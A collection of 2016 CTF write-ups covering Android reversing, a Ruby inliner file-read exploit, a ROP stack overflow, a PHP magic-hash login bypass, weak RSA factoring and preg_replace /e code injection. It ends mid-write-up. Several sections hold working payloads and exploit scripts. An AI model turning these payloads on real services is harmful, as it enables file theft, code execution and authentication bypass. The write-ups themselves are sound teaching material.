<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-0xbu
description: CTF writeups and security challenges by 0xBU.
---

# Writeups by 0xBU

Source repository: `/repos/0xBU`

## Repository Index

- writeups/README.md
- writeups/0ctf2016/boomshakalaka.md
- writeups/bkp2016/optiproxy.md
- writeups/bkp2016/simple_calc.md
- writeups/internetwache2016/mess_of_hash.md
- writeups/internetwache2016/oh_bob.md
- writeups/internetwache2016/quick_run.md
- writeups/internetwache2016/replace_with_grace.md
- writeups/internetwache2016/serverfarm.md
- writeups/internetwache2016/texmaker.md

## Writeup Content


### File: writeups/README.md

Check out https://0xbu.com/writeups for the latest. This won't be updated anymore. 



### File: writeups/0ctf2016/boomshakalaka.md

# boomshakalaka (plane)
> play the game, get the highest score  
boomshakalaka  

(*mobile*)

This was an Android reverse engineering challenge. We're given an `apk`, *plane.apk*. First thing to do is check out the apk by 
launching an emulator, or using your phone. I do some Android development right now, so I already had a couple of Android VMs 
ready made in [Android Studio](http://developer.android.com/sdk/index.html). 

```
$ adb devices
List of devices attached
emulator-5556	device
$ adb install plane.apk # Note: The emulator must have an ARM ABI, not x86 for this apk
```

![](/blog/content/images/2016/03/plane.png)
Turns out it's a pretty fun game! Nothing really sticks out from a security and puzzle perspective.
Well, let's take a look into the source code. We're given an `apk` file, which is just a fancy Android `jar`, and a `jar` file is 
just a fancy Java `zip` file, so all the contents that form the app are contained inside the `apk` and just need to be unpacked. 
We can either unpack the `dex` files (fancy Android .class files), or `smali` assembly. I did the latter first, by using the tool, 
[apktool](http://ibotpeaches.github.io/Apktool/).

```
$ apktool d plane.apk
$ ls
AndroidManifest.xml  apktool.yml  assets  lib  original  res  smali
$ ls smali/com/example/plane/
a.smali  BuildConfig.smali  FirstTest.smali  R$attr.smali  R$drawable.smali  R.smali  R$string.smali
```

We have every file inside of the `apk`, you can browse around the directories and figure out how the application works. The 
interesting parts are in [a.smali](https://gist.github.com/eugenekolo/f125dee08320b9b5d43c#file-a-smali), and 
[FirstTest.smali](https://gist.github.com/eugenekolo/f125dee08320b9b5d43c#file-firsttest-smali). The first thing you'll notice is 
the base64 string: `const-string v0, "YmF6aW5nYWFhYQ=="`, decoded to: "bazingaaaa" - funny. Without diving into how to read Java 
bytecode, it looks like the programs don't really do too much interesting except set some shared preferences (persistent global 
variables), put some weird strings (`DATA`, `N0`, and `MG`) into them, and call the init functions. There's no actual game logic 
anywhere though - it must be implemented elsewhere. Looking back into the directories that `apktool` told us, we can find 
`lib/armeabi/libcocos2dcpp.so`. So the actual logic and everything for the game must be written in "native code" inside of the 
`libcocos2dcpp.so`. We have to take a peak at the code inside of that compiled native binary... but before that, let's backtrack 
and make sure we understand the Java side of the code.

I know of a couple more tool for decompiling and reversing Android programs, [dex2jar](https://github.com/pxb1988/dex2jar) and 
[jd-gui](http://jd.benow.ca/). All these great tools used are included in my [sec-tools 
collection](https://github.com/eugenekolo/sec-tools).

```
$ dex2jar plane.apk
dex2jar plane.apk -> ./plane-dex2jar.jar
$ jdgui plane-dex2jar.jar
```

Produces us these decompiled Java files: [a.java](https://gist.github.com/eugenekolo/f125dee08320b9b5d43c#file-a-java) and 
[FirstTest.java](https://gist.github.com/eugenekolo/f125dee08320b9b5d43c#file-firsttest-java). Pretty much what we understood in 
the earlier `smali` files, but much clearer. This is a good technique to keep in mind when reversing future Android apps.

Back to the `libcocos2dcpp.so`, let's look for those strings we saw on the Java side of the app, specifically `DATA` (that's a 
juicy one).

![IDA Strings](/blog/content/images/2016/03/idaboomshaka.png)

Interesting other strings near it.

![IDA Cross References](/blog/content/images/2016/03/idaboom-shaka.png)

`setStringForKey` from `cocos2d` seems to use this string in some sort of way. Looking up what the function does leads me to 
[cocos2d reference manual](http://www.cocos2d-x.org/reference/native-cpp/V3.0alpha0/db/d94/classcocos2d_1_1_user_default.html). It 
looks like the function sets a key to be equal to a string. This sounds like persistent memory storage, *for things like the game 
score!*

Remember the description of this challenge... our goal is to get the highest score. Remembering my teenage years, I used to cheat 
in some games that stored things like the game score in a simple text file. I wonder if we can do the same thing here, and just 
change some number stored in a text file, get the highest score, and get our flag.

Let's do that.

```shell
$ adb shell
$ cd /data/data/com.example.plane/shared_prefs
$ cat Cocos2dxPrefsFile.xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <int name="HighestScore" value="14000" />
    <string 
name="DATA">MGN0ZntDMGNvUzJkX0FuRHJvdz99ZntDMGNvUzJkX0FuRHJvMWRzdz99ZntDMGNvUzJkX0FuRHJvRfdz99ZntDMGNvUzJkX0FuRHJvMWRzdz99ZntDMGNvUzJkX0FuRHJvMWdz99ZntDMGNvUzJkX0FuRHJvRfRz</string>
    <boolean name="isHaveSaveFileXml" value="true" />
</map>
$ echo 
'MGN0ZntDMGNvUzJkX0FuRHJvdz99ZntDMGNvUzJkX0FuRHJvMWRzdz99ZntDMGNvUzJkX0FuRHJvRfdz99ZntDMGNvUzJkX0FuRHJvMWRzdz99ZntDMGNvUzJkX0FuRHJvMWdz99ZntDMGNvUzJkX0FuRHJvRfRz' 
| base64 --decode
0ctf{C0coS2d_AnDrow?}f{C0coS2d_AnDro1dsw?}f{C0coS2d_AnDroE�s��g�3
6�3&E�
�G&�
G7s��g�3
6�3&E�
�G&�
w?}f{C0coS2d_AnDroE�s
```

Trying out, `0ctf{C0coS2d_AnDrow?}` won't do us any good, it's not the flag. I tried a bunch of combinations such as 
`0ctf{0ctf{C0coS2d_AnDro1d?}` as well, it's none of that. Okay. Let's think. We seem to have a repeating pattern in the base64. 
Some examination of the base64 compared to the ASCII output reveals that `MGN0` is actually '0ct', and `ZntD` is 'f{C', and `dz99` 
is 'w?}', and some stuff inbetween. It looks like we have to use the pieces of data we saw in the `.so` binary to form some sort 
of base64 that'll decode into the flag. Editing the `HighestScore` value to `1000000` and playing the game, and then checking back 
the `xml` file doesn't seem to do anything. 

If you look for all the tiny strings near the ones we found around `DATA` that are "base64-esque", you'll get this list: `Jv Uz X0 
Zn tD dz99 MG Nv Fu Jk RH 4w S2 Vf b1 9z RV Bt Rz Rf MW`. We have to probably use them in the right order, we already know the 
placement of most of those. We really only need to basically place ~8 strings in the correct order that'll decode correctly into 
ASCII. You can bruteforce, or you can examine the binary .so some more.

The characters seem to get added to the string, `DATA`, inside of the `Cocos2dxPrefsFile.xml` when the game is initialized, when 
the game layers are loaded, when certain high scores are achieved, and when the game is ending. By following the logical 
progression that would happen, e.g. you init first, load layers, get high score in linear order, and end the game, you'll form the 
correct base64 string.

```
echo 'MGN0ZntDMGNvUzJkX0FuRHJvMWRfRzBtRV9Zb1VfS24wdz99' | base64 --decode
0ctf{C0coS2d_AnDro1d_G0mE_YoU_Kn0w?}
```



### File: writeups/bkp2016/optiproxy.md

# OptiProxy
*(web, solved by 115)*  
>  inlining proxy here http://optiproxy.bostonkey.party:5300

This was a fun challenge about a vulnerable Ruby program. Navigating to the webpage given brings us to a 
simple website that prompts us:

```
welcome to the automatic resource inliner, we inline all images go to /example.com to get an inlined 
version of example.com flag is in /flag source is in /source
```

Unfortunately the flag is not as easy as just navigating to http://optiproxy.bostonkey.party:5300/flag.

Navigating to `/source` gives us the source code:

```
require 'nokogiri' 
require 'open-uri' 
require 'sinatra' 
require 'shellwords' 
require 'base64' 
require 'fileutils' 

set :bind, "0.0.0.0" 
set :port, 5300 
cdir = Dir.pwd 

get '/' do str = "welcome to the automatic resource inliner, we inline all images" str << " go to 
/example.com to get an inlined version of example.com" str << " flag 
is in /flag" str << " source is in /source" str end 

get '/source' do IO.read "/home/optiproxy/optiproxy.rb" end 

get '/flag' do str = "I mean, /flag on the file system... If you're looking here, I question" str << " your 
skills" str end 

get '/:url' 
do 
	url = params[:url] 
	main_dir = Dir.pwd 
	temp_dir = "" 
	dir = Dir.mktmpdir "inliner" Dir.chdir dir 
	temp_dir = dir 
	exec = "timeout 2 wget -T 2 --page-requisites #{Shellwords.shellescape url}" `#{exec}` 
	my_dir = Dir.glob ("**/") Dir.chdir my_dir[0] 
	index_file = "index.html" 
	html_file = IO.read index_file 
	doc = Nokogiri::HTML(open(index_file)) 
	doc.xpath('//img').each 
	do 
		|img| header = img.xpath('preceding::h2[1]').text 
		image = img['src'] 
		img_data = "" 
		uri_scheme = URI(image).scheme 
			begin if (uri_scheme == "http" or uri_scheme == "https") 
				url = image 
			else 
				url = "http://#{url}/#{image}" 
			end 
		img_data = open(url).read 
		b64d = "data:image/png;base64," + Base64.strict_encode64(img_data) 
		img['src'] = b64d rescue # gotta catch 'em all puts "lole" next end 
	end 
	puts dir FileUtils.rm_rf dir Dir.chdir main_dir doc.to_html 
end
```

At first glance, you might think to try exploiting `exec = "timeout 2 wget -T 2 --page-requisites #{Shellwords.shellescape url}`, but I was unable to find anything online that is able to escape 
`Shellwords.shellescape`. I believe it's safe to assume, that's a well written module, with no known 
exploits, and finding a 0day in it, while possible, is probably outside the scope of the challenge.

Moving on to understanding what exactly the code is doing, it seems to follow these steps:

1. Parse out the parameter given after `/`, e.g. `example.com` if navigated to 
`http://optiproxy.bostonkey.party:5300/example.com`
2. Create a folder named `inliner` and change directory into it.
3. Run `wget` to create a mirror of the website provided in (1)
4. Parse `index.html` from the mirrored website, and for each `img` tag:   
  1. Grab the `src` parameter of the `img` tag
     * If the `src` parameter's URI scheme is `http` or `https`, it's good to go
     * Else if the URI scheme isn't `http` or `https`, then form a string that does have `http` uri scheme
  2. Open the `url` string created in (4a), and read the data from it
  3. Base64 the image data read, and change the `src` parameter of the img tag to the base64 of the image 
data
5. Return the `inliner` dir to the user of the web app, and clean up

Okay, so where's the exploit? First things first, I tried passing something more interesting than just a 
simple webpage as the `url` to the web app to inline, i.e. `file://../../../../flag`, meaning I navigated 
to `http://optiproxy.bostonkey.party:5300/file://../../../../flag`, but that just returns to us the error 
message saying flag isn't there. I then thought that what I actually need is a website with an `img` tag 
whose `src` parameter is `file://../../../../flag`, so I whipped that up quickly:

```
<html><body> 
<img src="file://../../../../flag" />
</body></html>
```

I served the webpage off of my remote server with `python3 -m http.server` for a quick HTTP server. 
Navigating over to `http://optiproxy.bostonkey.party:5300/mywebsite.com:8000` gives me a blank screen. 
Checking the console and source code reveals the issue: `Not allowed to load local resource: 
file://../flag`

It looks like the web app did mirror my website, it just didn't actually open the file, because of the 
`uri_scheme` check, `file != http`. Okay, so we really do need something that'll pass the URI scheme check, 
back to Google to learn more about Ruby's `uri_scheme` leads me to 
http://sakurity.com/blog/2015/02/28/openuri.html, *jackpot*. Interesting, it seems that a URL like 
`http:/foobar` will pass the `uri_scheme` check, and if we can somehow have a folder named `http:` (note 
the `:`) then we have a remote file read (into `/flag`!). *Now... how do we possibly make the folder named 
`http:`.* 

After some thinking, I realized the solution, just make our fake website have a subdirectory named `http:` 
that'll get included by the `index.html`, because the `wget` call in the webapp is 2 levels deep, this will 
work! 

```
<html><body> 
<img src="./http:/hi" />
<img src="http:/../../../../../../../../flag" /> 
</body></html>
```

Note that the 2nd `src` tag above, is to `http:/`, and not `http://`. Getting that website inlined, will 
cause the Ruby web application to create a directory structure with a folder named `http:` in it, and then 
open a file in reference to the folder `http:`, and return to us:

```
<html><body> 
<img src="data:image/png;base64,aGloaQo=">
<img src="data:image/png;base64,QktQQ1RGe21heWJlIGRvbnQgaW5saW5lIGV2ZXJ5dGhpbmcufQo="> 
</body></html>
```

Decode the 2nd base64:
`BKPCTF{maybe dont inline everything.}`



### File: writeups/bkp2016/simple_calc.md

# Simple Calc
*(pwn, solved by 186)*  
> what a nice little calculator!   
https://s3.amazonaws.com/bostonkeyparty/2016/b28b103ea5f1171553554f0127696a18c6d2dcf7  
simplecalc.bostonkey.party 5400

I teamed up with [@kierk](https://github.com/kierk) for this challenge.

We're given an ELF64 binary. Opening it up in IDA and running the decompiler reveals to us:

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  void *v3; // rdi@1
  int result; // eax@3
  const char *v5; // rdi@4
  __int64 v6; // rax@4
  char v7; // [sp+10h] [bp-40h]@14
  int v8; // [sp+38h] [bp-18h]@5
  int v9; // [sp+3Ch] [bp-14h]@1
  __int64 v10; // [sp+40h] [bp-10h]@4
  int i; // [sp+4Ch] [bp-4h]@4

  v9 = 0;
  setvbuf(stdin, 0LL, 2LL, 0LL);
  v3 = stdout;
  setvbuf(stdout, 0LL, 2LL, 0LL);
  print_motd(v3);
  printf((unsigned __int64)"Expected number of calculations: ");
  _isoc99_scanf((unsigned __int64)"%d");
  handle_newline("%d", &v9);
  if ( v9 <= 255 && v9 > 3 )
  {
    v5 = (const char *)(4 * v9);
    LODWORD(v6) = malloc(v5);
    v10 = v6;
    for ( i = 0; i < v9; ++i )
    {
      print_menu(v5);
      v5 = "%d";
      _isoc99_scanf((unsigned __int64)"%d");
      handle_newline("%d", &v8);
      switch ( v8 )
      {
        case 1:
          adds("%d");
          *(_DWORD *)(v10 + 4LL * i) = dword_6C4A88;
          break;
        case 2:
          subs("%d");
          *(_DWORD *)(v10 + 4LL * i) = dword_6C4AB8;
          break;
        case 3:
          muls("%d");
          *(_DWORD *)(v10 + 4LL * i) = dword_6C4AA8;
          break;
        case 4:
          divs("%d");
          *(_DWORD *)(v10 + 4LL * i) = dword_6C4A98;
          break;
        default:
          if ( v8 == 5 )
          {
            memcpy(&v7, v10, 4 * v9);
            free(v10);
            return 0;
          }
          v5 = "Invalid option.\n";
          puts("Invalid option.\n");
          break;
      }
    }
    free(v10);
    result = 0;
  }
  else
  {
    puts("Invalid number.");
    result = 0;
  }
  return result;
}
```

It seems the program is infact, a simple calc. The program can add, subtract, multiply, or divide for us. 
Looking deeper into the program's functions reveals that there's nothing really too interesting, summarized 
here:

* print_motd - a simple 1 line `printf`, nothing exploitable
* handle_newline - does `getchar` until a `\0` or a `\n`, perhaps buggy, but doesn't seem exploitable
* print_menu - simple `printf`s, nothing exploitable
* adds, subs, muls, divs - do basic arithmetic of two arguments, the arguments are limited to > 39, for 
some reason. It seems you can cause integer overflows here perhaps. The interesting thing in these is that 
result of the functions seems to get put into the global data section, `.bss`.

The `main` function allows us 5 options, the 4 basic math operators, and a save and exit. The save and exit 
is particularly interesting. The save and exit option does a `memcpy` of global memory onto the stack. 
However, there was only 11 dwords allocated for the copy operation by the stack. If we ask main for more 
than 11 operations, prompted here: `printf((unsigned __int64)"Expected number of calculations: ");`, then 
we'll have a simple stack buffer overflow. With that, we can overwrite the return address, and initiate a 
ropchain. 

There is one other interesting point here, and that's the call to `free()`. Initially we ran into the 
problem of `free()` failing, and causing a segmentation fault when we were playing with the program with 
over 11 operations. That's because we kept spamming the global memory with the values "40..41..42..43..44", 
and `free()` would try to free the memory located at `0x0000000000000059`. We were stuck, but we guessed 
perhaps `free()` doesn't fail for 0 or null, and that turned out to be true, as documented here:

>The free function causes the space pointed to by ptr to be deallocated, that is, made available for 
further allocation. If ptr is a null pointer, no action occurs.

So we can simply make sure the 19th value copied onto the stack is `0x0000000000000000`.

So let's create this ropchain, luckily the binary is gigantic, and has everything we need. Running 
[ropgadget](https://github.com/JonathanSalwan/ROPgadget) (also included in my 
[sec-tools](https://github.com/eugenekolo/sec-tools)) on the binary produces for us an already complete 
ropchain:

```
ropgadget --binary b28b103ea5f1171553554f0127696a18c6d2dcf7 --ropchain
> https://gist.github.com/eugenekolo/d07741d6e7b261b3c339#file-ropchain-py
```

Now, we have to get that chain onto the stack, and we're set. We have control of a global array in memory 
that gets copied onto the stack. Getting the exact bytes we want into that global array is a bit tricky. We 
have to use one of the operations of the calculator (`sub` is my favourite), with specially crafted 
operands. The result of that calculation will be put into the global array. *This part is a bit tricky in 
that it takes 2 operations of the calculator to fill 64-bit blocks in memory that the program uses (due to 
it being a 64-bit elf) - the calculations return 32-bit numbers.* So, we end up with a chain of operations 
that looks like this:

```
2          # Subtract operation
4602868
100        # Result = 4602768

2          # Subtract operation
100
100        # Result = 0

2          # Subtract operation
4602868
100        # Result = 4602768

2          # Subtract operation
100
100        # Result = 0

...

5 # Save and exit operation
```

That will result in `0x0000000000463B90` and `0x0000000000463B90` quad-words in the global memory.

The global array is then copied onto the stack with a `save and exit`. The copying overwrites the return 
address on the stack, and begins our ropchain.

Now we have to somehow get the entire ropchain into memory with some calculator operations. I went with a 
low-tech pwning script for this exploitation. I wrote a 
[pwn\_script](https://gist.github.com/eugenekolo/d07741d6e7b261b3c339#file-pwn-py) that outputted the above 
chain of operations, newlines included. When the 
[pwn_header](https://gist.github.com/eugenekolo/d07741d6e7b261b3c339#file-pwn_header-py) (to initiate 254 
operations, and make sure `free()` frees `0x0`) and the output of the 
[pwn\_script](https://gist.github.com/eugenekolo/d07741d6e7b261b3c339#file-pwn-py) is copied into the 
remote session of the challenge, `nc simplecalc.bostonkey.party 5400`, a series of subtraction operations 
with different operands will occur. Finally a `5` will be passed to the remote session, and cause a `save 
and exit`. That will kick off the ropchain now in the `.bss` section, revealing to us this tasty shell:

```
$ ls
key
run.sh
simpleCalc
simpleCalc_v2
socat_1.7.2.3-1_amd64.deb
$ cat key
BKPCTF{what_is_2015_minus_7547}
```




### File: writeups/internetwache2016/mess_of_hash.md

# Mess of Hash
*(web50, solved by 170)*  
> Students have developed a new admin login technique. I doubt that it's secure, but the hash isn't 
crackable. I don't know where the problem is...

This was an interesting challenge. On unzipping the challenge you're presented with a single README.txt.
```
All info I have is this:
<?php

$admin_user = "pr0_adm1n";
$admin_pw = clean_hash("0e408306536730731920197920342119");

function clean_hash($hash) {
    return preg_replace("/[^0-9a-f]/","",$hash);
}

function myhash($str) {
    return clean_hash(md5(md5($str) . "SALT"));
}
```

The website listed in the challenge description is simply a login screen. It's unlikely the challenge is 
meant to be an SQL injection, or XSS, or anything like that. Checking some basic directories/files 
consistent with the other challenges tells me that `admin.php` doesn't exist, nor does `admin`, but 
`flag.php` is there, it's just not readable (`flag.php` page loads, it's just blank). 

So we have to somehow read that `flag.php`. There's really two ways, it's either just presented to us if we 
login as the 'pr0\_adm1n' user, or via SQLi. Let's see what we can think of for how to login as 
'pr0\_adm1n' knowing we have what seems to be the server-side hashing code, and the admin's hashed 
password. 

Path of least resistance... we can guess the hash is md5, based on the length of it, let's see if it's 
cracked already online! *Nope, google shows up nothing.* Okay, so the hashing code seems to take in a 
`$str`, which I guess is probably the password when a user is created in this fictional school (from the 
challenge description). The password is hashed, then the string "SALT" is appended to it, i.e. salting it, 
and then it's hashed again. And then for some reason, that I'm not too sure about, it seems to remove all 
non-hex characters. 

The hashing seems clean. I don't see how to get a hash collision, and bruteforce would be lame, and 
considering it's not found online, it's probably not a short password. I'm out of ideas here, the best I 
can think of is that this is another one of PHP's infamous security holes, and the `md5` function is 
somehow poorly implemented. Googling for "md5 php dangerous" leads me to [PHP: md5('240610708') == 
md5('QNKCDZO')](https://news.ycombinator.com/item?id=9484757). Interesting... so reading that it seems that 
PHP has a weird type issue:

> All of them start with 0e, which makes me think that they're being parsed as floats and getting converted 
to 0.0. 

This is exactly what we have. We just have to find a string that `myhash()`'s into something that starts 
with `0e`, and then it will collide with the check on `$admin_pw`. Turns out the requirement is a bit 
stricter, and every hex character after `0e` also has to be decimal, 0-9, for the conversion to float 0.0 
to happen. But, this is still doable, and we now have a much smaller search space.
```
<?php
$admin_user = "pr0_adm1n";
$admin_pw = clean_hash("0e408306536730731920197920342119");

function clean_hash($hash) {
    return preg_replace("/[^0-9a-f]/","",$hash);
}

function myhash($str) {
    return clean_hash(md5(md5($str) . "SALT"));
}

function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

for ($i = 0; $i < 100000000; $i++) {
	$result = generateRandomString(8);
	if (myhash($result) == $admin_pw) {
		print("woo!");
		print($result . "  " . myhash($result) . "\n");
	}
}
?>
```

```
woo!KyJg0SXC  0e588095185108872523046880371953
```

Logging in with the username, `pr0_adm1n`, and password, `KyJg0SXC`, will lead to a hash collision, and at 
login `flag.php` is displayed.

```
IW{T4K3_C4RE_AND_C0MP4R3}
```





### File: writeups/internetwache2016/oh_bob.md

# Oh Bob!
*(crypto60, solved by 167)*
> Alice wants to send Bob a confidential message. They both remember the crypto lecture about RSA. So Bob 
uses openssl to create key pairs. Finally, Alice encrypts the message with Bob's public keys and sends it 
to Bob. Clever Eve was able to intercept it. Can you help Eve to decrypt the message?

After unzipping the challenge, we're presented with four files, three public keys, and one file with three 
encrypted strings.
```
cat bob.pub
-----BEGIN PUBLIC KEY-----
MDgwDQYJKoZIhvcNAQEBBQADJwAwJAIdDVZLl4+dIzUElY7ti3RDcyge0UGLKfHs
+oCT2M8CAwEAAQ==
-----END PUBLIC KEY-----
```
```
cat secret.enc
DK9dt2MTybMqRz/N2RUMq2qauvqFIOnQ89mLjXY=

AK/WPYsK5ECFsupuW98bCFKYUApgrQ6LTcm3KxY=

CiLSeTUCCKkyNf8NVnifGKKS2FJ7VnWKnEdygXY=
```

The description tells us, that we have to decrypt the secret encoded messages. This is [public-key 
cryptography](https://upload.wikimedia.org/wikipedia/commons/f/f9/Public_key_encryption.svg), but all we 
have are the public keys. To decrypt the messages, we need the private keys.

Luckily, judging by the size of the base64 encoded public keys, the keys are very small. RSA is *only* 
secure when a large enough key is used at a minimum 1024-bits, and 2048-bits or more is recommended.

I've never done this before, so my thought was to first figure out what type of key this is, and then 
figure out how to extract the components of the key (asymmetric keys are not typically simple byte arrays, 
but instead several numbers concatenated together), and then see where to go from there. *This lead me no 
where.* Finding the right `openssl` commands to use on the key was proving impossible. Every command I 
found online to simply figure out the type of public key (we don't know if it's RSA, DSA, or something 
else) inside the given files was giving an error. Eventually I stumbled upon something that finally worked:
```
openssl asn1parse -dump -i -in bob2.pub
    0:d=0  hl=2 l=  56 cons: SEQUENCE          
    2:d=1  hl=2 l=  13 cons:  SEQUENCE          
    4:d=2  hl=2 l=   9 prim:   OBJECT            :rsaEncryption
   15:d=2  hl=2 l=   0 prim:   NULL              
   17:d=1  hl=2 l=  39 prim:  BIT STRING        
```
Okay, at this point at least I know it's an RSA key finally. I sort of can guess from the output of this 
that the parts of the key take up 39 bytes. I know that in RSA the "key size" is actually just the modulus 
in the RSA equation, so the key is ~256 bits - bruteforceable.

Through some luck I stumbled upon, https://warrenguy.me/blog/regenerating-rsa-private-key-python. Following 
his guide I'm able import a public key, and obtain the key's modulus and exponent (the 2 numbers stored in 
an RSA public key). The modulus can be factored into `p*q`, through bruteforce, since the modulus is so 
small - this is a significantly harder bruteforce when the modulus is 4096 bits. Using those factors, we 
then obtain the final piece of an RSA private key, the private exponent (a RSA private key is `p,q,d`, 
whereas a public key is `n,e`). `Pycrypto` has a great `construct` function that allows to easily recreate 
the corresponding private key. Applying this approach to each of Bob's public keys we can decrypt each 
message in `secret.enc`. 

Some additional finagling has to be done to apply each recovered private key to each part of the 
`secret.enc` file. For that I just used simple copy pasting into 3 separate files. Padding is also 
typically used in crypto, and we have to account for that. And finally, the authors either messed up or 
intentionally (or maybe I messed something up?) ordered the messages in `secret.enc` as corresponding to 
`bob.pub`,`bob3.pub`, `bob2.pub` in that order.

```
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
import gmpy 
import base64
from Crypto import Random
from Crypto.Hash import SHA

bob1 = """-----BEGIN PUBLIC KEY-----
MDgwDQYJKoZIhvcNAQEBBQADJwAwJAIdDVZLl4+dIzUElY7ti3RDcyge0UGLKfHs
+oCT2M8CAwEAAQ==
-----END PUBLIC KEY-----"""
bob2 = """-----BEGIN PUBLIC KEY-----
MDgwDQYJKoZIhvcNAQEBBQADJwAwJAIdCiM3Dn0PsAIyFkrG1kKED8VOkgJDP5J6
YOta29kCAwEAAQ==
-----END PUBLIC KEY-----"""
bob3 = """-----BEGIN PUBLIC KEY-----
MDgwDQYJKoZIhvcNAQEBBQADJwAwJAIdDFtp4ZeeVB+F2s3iqhTSciqEb0Gz24Pm
Z+Oz0R0CAwEAAQ==
-----END PUBLIC KEY-----"""

pub1 = RSA.importKey(bob1)
pub2 = RSA.importKey(bob2)
pub3 = RSA.importKey(bob3)

n1 = long(pub1.n)
e1 = long(pub1.e)
n2 = long(pub2.n)
e2 = long(pub2.e)
n3 = long(pub3.n)
e3 = long(pub3.e)

# Obtained using msieve. Should probably fully pythonize this by using pysieve.
p1 = 17963604736595708916714953362445519
q1 = 20016431322579245244930631426505729
p2 = 16514150337068782027309734859141427
q2 = 16549930833331357120312254608496323
p3 = 17357677172158834256725194757225793
q3 = 19193025210159847056853811703017693

d1 = long(gmpy.invert(e1,(p1-1)*(q1-1)))
d2 = long(gmpy.invert(e2,(p2-1)*(q2-1)))
d3 = long(gmpy.invert(e3,(p3-1)*(q3-1)))

key1 = RSA.construct((n1,e1,d1))
key2 = RSA.construct((n2,e2,d2))
key3 = RSA.construct((n3,e3,d3))

# THE KEYS WERE OUT OF ORDER!!! AAARGH!
with open('secret1.bin','r') as f1:
    enc1 = f1.read()
with open('secret3.bin','r') as f2:
    enc2 = f2.read()
with open('secret2.bin','r') as f3:
    enc3 = f3.read()

dsize = SHA.digest_size
sentinel = Random.new().read(15+dsize)

cipher = PKCS1_v1_5.new(key1)
secret = cipher.decrypt(enc1, sentinel)
print("--- secret 1 ---")
print(secret)

cipher = PKCS1_v1_5.new(key2)
secret = cipher.decrypt(enc2, sentinel)
print("--- secret 2 ---")
print(secret)

cipher = PKCS1_v1_5.new(key3)
secret = cipher.decrypt(enc3, sentinel)
print("--- secret 3 ---")
print(secret)
```
```
IW{WEAK_RSA_K3YS_4R3_SO_BAD!}
```



### File: writeups/internetwache2016/quick_run.md

# Quick Run
*(misc60, solved by 269)* 
> Someone sent me a file with white and black rectangles. I don't know how to read it. Can you help me?

This was a funny challenge where after unzipping it you're presented with a single file that contains a 
bunch of wonky looking text. If you base64 decode it, you're presented with a set of:
```
██████████████████████████████████████████████
██              ██    ██  ████              ██
██  ██████████  ██████  ██  ██  ██████████  ██
██  ██      ██  ██  ██████  ██  ██      ██  ██
██  ██      ██  ██████████████  ██      ██  ██
██  ██      ██  ██    ██    ██  ██      ██  ██
██  ██████████  ████  ████████  ██████████  ██
██              ██  ██  ██  ██              ██
██████████████████████  ██  ██████████████████
████  ████  ██  ████████      ████  ██  ██  ██
██  ██  ██  ████  ██  ██████      ██████    ██
██  ██          ██  ██      ████  ████████  ██
██  ████████  ██  ██  ██  ██  ██  ██  ██  ████
████  ██    ██  ██  ██  ██  ██  ██  ██  ██  ██
████████████████████  ██  ██  ██  ██  ██  ████
██              ██████  ██  ██  ██  ██  ██  ██
██  ██████████  ████  ██  ██  ██  ██  ██  ████
██  ██      ██  ██  ██  ██  ██  ██  ██  ██  ██
██  ██      ██  ████  ██  ██  ██  ██  ██  ████
██  ██      ██  ██████  ██  ██  ██  ██  ██  ██
██  ██████████  ██    ████████  ████  ██    ██
██              ██████          ██  ██  ██  ██
██████████████████████████████████████████████
```

These are actually QR codes, decoding each one reveals:
```
flagis:IW{QR_C0DES_RUL3}
```

We could've saved 5 minutes by realizing to start looking for 'IW' first, and not decoding 'flagis:'.





### File: writeups/internetwache2016/replace_with_grace.md

# Replace with Grace
*(web60, solved by 268)* 
> Regular expressions are pretty useful. Especially when you need to search and replace complex terms.
![](/blog/content/images/2016/02/replace.png)

It's a site that does simple search and replace on an input string.
For example:
```
Search: /cow/
Replace: cat
Input: cows are cute <3
-> cats are cute <3
```

My thought process for this challenge was then to find some sort of command injection. I was guessing that 
the site was using UNIX `sed`, by using pseudocode like:
```
cmd = 's' + <search> + <replace> + '/'
system("echo <input> | sed -i cmd")
```
A command injection in this case could be done by making `<replace>` something like `/;cat flag;`. But this 
wasn't working. I tried a few more avenues to get command injection in. Nothing worked. I was still 
convinced this was command injection into a UNIX shell, so I gave up for a bit and did other challenges.

Coming back to the challenge, after solving a few other web challenges, made me realize that this is 
probably just feeding strings into PHP's (since all the other web challenges are written in PHP) search and 
replace function. I'm not a PHP developer, but googling for PHP search and replace leads me to 
[preg\_replace](http://php.net/manual/en/function.preg-replace.php). Okay, it's probably this... doesn't 
seem bad, but PHP is notorious for being dangerous, so let's search up "[preg\_replace 
dangerous](https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace)". Sure enough, 
`preg_replace` has a "bug/feature/wtf" where appending an `/e` to the `<search>` parameter will cause the 
`<replace>` parameter to be executed as code. *Simple.* 

Testing some payloads, there seems to be a list of blocked words, that's nice that they tell us this error 
message and let us know our payload is on the right track. The blocked word checker is case-sensitive, and 
funny enough, PHP is not.

```
Search: /cow/e
Replace: syStEm("cat flag.php")
Input: Hi Mom!
-> $FLAG = IW{R3Pl4c3_N0t_S4F3}
```




### File: writeups/internetwache2016/serverfarm.md

# ServerfARM
*(rev70, solved by 186)*  
> Someone handed me this and told me that to pass the exam, I have to extract a secret string. I know 
cheating is bad, but once does not count. So are you willing to help me?

I teamed up with [@kierk](https://github.com/kierk) for this challenge.

After unzipping the challenge, we're presented with a single ELF32 ARM binary.
```
file serverfarm
serverfarm: ELF 32-bit LSB  executable, ARM, EABI5 version 1 (SYSV), dynamically linked (uses shared libs), 
for GNU/Linux 2.6.32, not stripped
```

Opening it up in IDA:  

![serverfarm1](/blog/content/images/2016/02/serverfarm.png)

Ignoring what it even does, jumping around to the subroutine it's calling (renamed to `handle_task`) and 
pressing `tab` to get IDA pseudocode.

![serverfarm2](/blog/content/images/2016/02/serverfarm2.png)

At this point, we're able to statically look over the code, with the knowledge of how the flag is supposed 
to look and piece together:

